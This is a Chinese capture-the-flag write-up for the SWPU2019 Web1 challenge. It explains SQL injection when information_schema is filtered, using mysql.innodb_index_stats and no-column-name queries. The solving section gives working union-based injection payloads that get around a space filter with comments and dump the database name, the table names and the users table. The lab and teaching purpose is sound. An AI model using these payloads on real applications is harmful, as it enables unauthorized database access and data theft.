# [SWPU2019]Web1 sql注入过滤了information 无列名查询

记录一道过滤 or 导致无法使用information_schema.tables的题目

## 前置知识

### 过滤information

在sql的时候其实很想知道 如果information_schmea.tables被过滤 那我是不是就完全sql不来了

这里就遇到了

主要是mysql中还存在着其他的表可以查询

例如mysql数据库中的 innodb_index_stats



<img src="https://i-blog.csdnimg.cn/blog_migrate/ae75e573b7a7f488f891bc30ff3864d0.png" alt="" style="max-height:282px; box-sizing:content-box;" />


还有sys数据库中的schema_auto_increment_columns



<img src="https://i-blog.csdnimg.cn/blog_migrate/6f84aee4465045d24eb822392bae179a.png" alt="" style="max-height:177px; box-sizing:content-box;" />


但是这个题目不存在

所以我们还是使用mysql.innodb_index_stats

### 无列名查询

因为mysql.innodb_index_stats不存在列名 所以我们只能通过无列明查询

其实这个我们在sql注入已经会了 就是select 1,2,3,4

但是意义不一样

我们来看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/f4602be9b8160fca2d6dc59c7e5c8c50.png" alt="" style="max-height:235px; box-sizing:content-box;" />


之前判断字段是无法回显字符的

我们把它作为一个表来返回



<img src="https://i-blog.csdnimg.cn/blog_migrate/ed87ccfbce21fad0900b5d9e961ca417.png" alt="" style="max-height:238px; box-sizing:content-box;" />


这里通过联合查询 就可以将 数据返回

但是我们有的时候只需要其中一个 我们就可以将其作为一个表 然后去查询他

例如



<img src="https://i-blog.csdnimg.cn/blog_migrate/c48bf3495405dc4577cb0c46bdeb978e.png" alt="" style="max-height:212px; box-sizing:content-box;" />


这样我们就取得了 第二列的数据了

个人觉得还是很好理解的

## 做题

首先我们得到了这个网站



<img src="https://i-blog.csdnimg.cn/blog_migrate/80a40fd37aa15b5777eaaba104da9654.png" alt="" style="max-height:300px; box-sizing:content-box;" />


想去试试弱口令 无果

只能通过注册去注册一个了



<img src="https://i-blog.csdnimg.cn/blog_migrate/931b5b6c70c8b3d482c87c943a236957.png" alt="" style="max-height:341px; box-sizing:content-box;" />


只存在两个功能点 一个是发布公告

我们去看看有什么用处



<img src="https://i-blog.csdnimg.cn/blog_migrate/9de1f7cf41d881ca9fe5fc0c4ffa2283.png" alt="" style="max-height:106px; box-sizing:content-box;" />


发现发布后可以进行查看详情 查询

那我们是不是可以通过sql来(这里是看wp的 思维跳跃太大了没想到是sql注入)



<img src="https://i-blog.csdnimg.cn/blog_migrate/dbfad99f60464c67d66d9d7a1bce9d6b.png" alt="" style="max-height:229px; box-sizing:content-box;" />


### 发现过滤了 空格 我们直接/**/绕过



<img src="https://i-blog.csdnimg.cn/blog_migrate/10542acf8466a56d0002128586564754.png" alt="" style="max-height:156px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/d39341ffdc48439613919b18f9f0d543.png" alt="" style="max-height:124px; box-sizing:content-box;" />


确定了是sql注入 但是没有实现闭合 我们研究了一下 是最后还有个单引号 所以我们在最后加一个单引号让他为空字符



<img src="https://i-blog.csdnimg.cn/blog_migrate/5df12a5b6c691d06741c8276dfae188d.png" alt="" style="max-height:194px; box-sizing:content-box;" />


报错说字段错误 我们就开始尝试了

经过尝试

22个字段 真的多。。。。。

```csharp
1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/cf0080b79d9d754da98328f7c8feb2f2.png" alt="" style="max-height:116px; box-sizing:content-box;" />


我们可以开始查询了

### 爆数据库

```csharp
1'/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/92c93103e2e574e7d497ae760706744a.png" alt="" style="max-height:178px; box-sizing:content-box;" />


### 爆破表

```csharp
1'/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_index_stats/**/where/**/database_name="web1"'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/3aa9dd05acf0f25ac67bae8872258b19.png" alt="" style="max-height:109px; box-sizing:content-box;" />


### 爆破值 （无列名查询）

```csharp
1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/cd8c084b8bd0001a61955d514d8ec8e6.png" alt="" style="max-height:157px; box-sizing:content-box;" />


这样就爆破出了值了